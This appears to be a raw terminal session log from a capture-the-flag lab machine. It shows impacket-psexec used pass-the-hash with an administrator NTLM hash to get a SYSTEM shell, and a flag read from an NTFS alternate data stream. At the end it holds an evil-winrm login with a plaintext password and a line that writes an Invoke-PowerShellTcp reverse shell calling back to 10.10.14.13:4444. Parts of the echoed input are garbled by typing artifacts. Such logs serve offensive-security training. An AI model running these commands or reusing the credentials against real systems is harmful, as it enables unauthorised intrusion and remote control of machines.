+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 600, in readFile
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] bytesRead = self._SMBConnection.read_andx(treeId, fileId, offset, toRead)
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 2065, in read_andx
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] return self.read(tid, fid, offset, max_size, wait_answer)
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1400, in read
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] ans = self.recvSMB(packetID)
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 535, in recvSMB
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] data = self._NetBIOSSession.recv_packet(self._timeout)
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 918, in recv_packet
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] data = self.__read(timeout)
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 1005, in __read
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] data = self.read_function(4, timeout)
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 987, in non_polling_read
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] received = self._sock.recv(bytes_left)
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] KeyboardInterrupt
+[2026-02-06 12:26:26] [pane=%2] [CMD_START] impacket-psexec administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+[2026-02-06 12:26:26] [w=2:tmux] [p=%2] [OUT] Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+[2026-02-06 12:26:27] [w=2:tmux] [p=%2] [OUT] [*] Requesting shares on 10.129.228.112.....
+[2026-02-06 12:26:27] [w=2:tmux] [p=%2] [OUT] [*] Found writable share ADMIN$
+[2026-02-06 12:26:27] [w=2:tmux] [p=%2] [OUT] [*] Uploading file foePvYUH.exe
+[2026-02-06 12:26:30] [w=2:tmux] [p=%2] [OUT] [*] Opening SVCManager on 10.129.228.112.....
+[2026-02-06 12:26:30] [w=2:tmux] [p=%2] [OUT] [*] Creating service mJjc on 10.129.228.112.....
+[2026-02-06 12:26:30] [w=2:tmux] [p=%2] [OUT] [*] Starting service mJjc.....
+[2026-02-06 12:26:31] [w=2:tmux] [p=%2] [OUT] [!] Press help for extra shell commands
+[2026-02-06 12:26:31] [w=2:tmux] [p=%2] [OUT] Microsoft Windows [Version 10.0.10586]
+[2026-02-06 12:26:31] [w=2:tmux] [p=%2] [OUT] (c) 2015 Microsoft Corporation. All rights reserved.
+[2026-02-06 12:26:34] [w=2:tmux] [p=%2] [OUT] C:\Windows\system32> pwd
+[2026-02-06 12:26:34] [w=2:tmux] [p=%2] [OUT] 'pwd' is not recognized as an internal or external command,
+[2026-02-06 12:26:34] [w=2:tmux] [p=%2] [OUT] operable program or batch file.
+[2026-02-06 12:26:49] [w=2:tmux] [p=%2] [OUT] C:\Windows\system32> cd ../../Users/Administarrator
+[2026-02-06 12:26:49] [w=2:tmux] [p=%2] [OUT] 
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT] C:\Users\Administrator> dier
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT]  Volume in drive C has no label.
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT] Volume Serial Number is 71A1-6FA1
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT] Directory of C:\Users\Administrator
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT] 11/03/2017  10:07 PM    <DIR>          .
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT] 11/03/2017  10:07 PM    <DIR>          ..
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:43 PM    <DIR>          .groovy
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT] 02/06/2026  02:06 PM    <DIR>          .jenkins
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:03 PM    <DIR>          Contacts
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT] 11/08/2017  09:05 AM    <DIR>          Desktop
+[2026-02-06 12:26:52] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:03 PM    <DIR>          Documents
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:33 PM    <DIR>          Downloads
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:03 PM    <DIR>          Favorites
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:16 PM    <DIR>          Links
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:03 PM    <DIR>          Music
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:16 PM    <DIR>          OneDrive
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:03 PM    <DIR>          Pictures
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:03 PM    <DIR>          Saved Games
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:10 PM    <DIR>          Searches
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 11/03/2017  09:03 PM    <DIR>          Videos
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 0 File(s)              0 bytes
+[2026-02-06 12:26:53] [w=2:tmux] [p=%2] [OUT] 16 Dir(s)   2,652,606,464 bytes free
+[2026-02-06 12:27:00] [w=2:tmux] [p=%2] [OUT] C:\Users\Administrator> cd SdesDesktop
+[2026-02-06 12:27:00] [w=2:tmux] [p=%2] [OUT] 
+[2026-02-06 12:27:01] [w=2:tmux] [p=%2] [OUT] C:\Users\Administrator\Desktop> dir
+[2026-02-06 12:27:01] [w=2:tmux] [p=%2] [OUT]  Volume in drive C has no label.
+[2026-02-06 12:27:01] [w=2:tmux] [p=%2] [OUT] Volume Serial Number is 71A1-6FA1
+[2026-02-06 12:27:01] [w=2:tmux] [p=%2] [OUT] Directory of C:\Users\Administrator\Desktop
+[2026-02-06 12:27:01] [w=2:tmux] [p=%2] [OUT] 11/08/2017  09:05 AM    <DIR>          .
+[2026-02-06 12:27:01] [w=2:tmux] [p=%2] [OUT] 11/08/2017  09:05 AM    <DIR>          ..
+[2026-02-06 12:27:01] [w=2:tmux] [p=%2] [OUT] 12/24/2017  02:51 AM                36 hm.txt
+[2026-02-06 12:27:01] [w=2:tmux] [p=%2] [OUT] 11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
+[2026-02-06 12:27:01] [w=2:tmux] [p=%2] [OUT] 2 File(s)            833 bytes
+[2026-02-06 12:27:01] [w=2:tmux] [p=%2] [OUT] 2 Dir(s)   2,652,606,464 bytes free
+[2026-02-06 12:27:08] [w=2:tmux] [p=%2] [OUT] C:\Users\Administrator\Desktop> type hm.txt
+[2026-02-06 12:27:08] [w=2:tmux] [p=%2] [OUT] The flag is elsewhere.  Look deeper.
+[2026-02-06 12:29:18] [w=2:tmux] [p=%2] [OUT] C:\Users\Administrator\Desktop> dir /R Cdir -Forece
+[2026-02-06 12:29:18] [w=2:tmux] [p=%2] [OUT]  Volume in drive C has no label.
+[2026-02-06 12:29:18] [w=2:tmux] [p=%2] [OUT] Volume Serial Number is 71A1-6FA1
+[2026-02-06 12:29:18] [w=2:tmux] [p=%2] [OUT] Directory of C:\Users\Administrator\Desktop
+[2026-02-06 12:29:18] [w=2:tmux] [p=%2] [OUT] File Not Found
+[2026-02-06 12:29:32] [w=2:tmux] [p=%2] [OUT] C:\Users\Administrator\Desktop> dir -Forcefprcoprce
+[2026-02-06 12:29:32] [w=2:tmux] [p=%2] [OUT]  Volume in drive C has no label.
+[2026-02-06 12:29:32] [w=2:tmux] [p=%2] [OUT] Volume Serial Number is 71A1-6FA1
+[2026-02-06 12:29:32] [w=2:tmux] [p=%2] [OUT] Directory of C:\Users\Administrator\Desktop
+[2026-02-06 12:29:32] [w=2:tmux] [p=%2] [OUT] File Not Found
+[2026-02-06 12:30:00] [w=2:tmux] [p=%2] [OUT] C:\Users\Administrator\Desktop> dir /R C:/\Users\Administrator\Desktop
+[2026-02-06 12:30:00] [w=2:tmux] [p=%2] [OUT]  Volume in drive C has no label.
+[2026-02-06 12:30:00] [w=2:tmux] [p=%2] [OUT] Volume Serial Number is 71A1-6FA1
+[2026-02-06 12:30:00] [w=2:tmux] [p=%2] [OUT] Directory of C:\Users\Administrator\Desktop
+[2026-02-06 12:30:00] [w=2:tmux] [p=%2] [OUT] 11/08/2017  09:05 AM    <DIR>          .
+[2026-02-06 12:30:00] [w=2:tmux] [p=%2] [OUT] 11/08/2017  09:05 AM    <DIR>          ..
+[2026-02-06 12:30:00] [w=2:tmux] [p=%2] [OUT] 12/24/2017  02:51 AM                36 hm.txt
+[2026-02-06 12:30:01] [w=2:tmux] [p=%2] [OUT] 34 hm.txt:root.txt:$DATA
+[2026-02-06 12:30:01] [w=2:tmux] [p=%2] [OUT] 11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
+[2026-02-06 12:30:01] [w=2:tmux] [p=%2] [OUT] 2 File(s)            833 bytes
+[2026-02-06 12:30:01] [w=2:tmux] [p=%2] [OUT] 2 Dir(s)   2,652,606,464 bytes free
+[2026-02-06 12:30:19] [w=2:tmux] [p=%2] [OUT] C:\Users\Administrator\Desktop> more < hm.tsxt:root.txt:$DATA
+[2026-02-06 12:30:20] [w=2:tmux] [p=%2] [OUT] afbc5bd4b615a60648cec41c6ac92530
+[2026-02-06 15:04:11] [w=2:tmux] [p=%2] [OUT] C:\Users\Administrator\Desktop> exitt
+[2026-02-06 15:04:30] [w=1:tmux] [p=%1] [OUT] c ^C
+[2026-02-06 15:04:30] [w=1:tmux] [p=%1] [OUT] Keyboard interrupt received, exiting.
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] ^CTraceback (most recent call last):
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/share/doc/python3-impacket/examples/psexec.py", line 677, in <module>
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] executer.run(remoteName, options.target_ip)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/share/doc/python3-impacket/examples/psexec.py", line 100, in run
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] self.doStuff(rpctransport)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/share/doc/python3-impacket/examples/psexec.py", line 198, in doStuff
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] ans = s.readNamedPipe(tid,fid_main,8)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 859, in readNamedPipe
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] return self.readFile(treeId, fileId, bytesToRead = bytesToRead, singleCall = True)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 600, in readFile
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] bytesRead = self._SMBConnection.read_andx(treeId, fileId, offset, toRead)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 2065, in read_andx
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] return self.read(tid, fid, offset, max_size, wait_answer)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1400, in read
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] ans = self.recvSMB(packetID)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 535, in recvSMB
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] data = self._NetBIOSSession.recv_packet(self._timeout)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 918, in recv_packet
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] data = self.__read(timeout)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 1005, in __read
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] data = self.read_function(4, timeout)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 987, in non_polling_read
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] received = self._sock.recv(bytes_left)
+[2026-02-06 15:04:31] [w=2:tmux] [p=%2] [OUT] KeyboardInterrupt
+[2026-02-06 15:04:36] [w=2:tmux] [p=%2] [OUT] esiiti es e evil-winrm -i 10.129.232.75 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'es
+[2026-02-06 15:04:37] [w=2:tmux] [p=%2] [OUT] e evil-winrm -i 10.129.232.75 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'ex
+[2026-02-06 15:04:38] [w=2:tmux] [p=%2] [OUT] exitexiexiitexit
+[2026-02-06 15:04:38] [pane=%2] [CMD_START] exit
+[2026-02-06 15:04:39] [pane=%0] [CMD_START] exit
+[2026-02-06 15:04:41] [w=1:tmux] [p=%1] [OUT] esxes e echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.13 -Port 4444' >> /tmp/shell.ps1
+[2026-02-06 15:04:43] [w=1:tmux] [p=%1] [OUT] tttmux kill-sessiontmtmutmux
+[2026-02-06 15:04:43] [pane=%1] [CMD_START] tmux kill-session
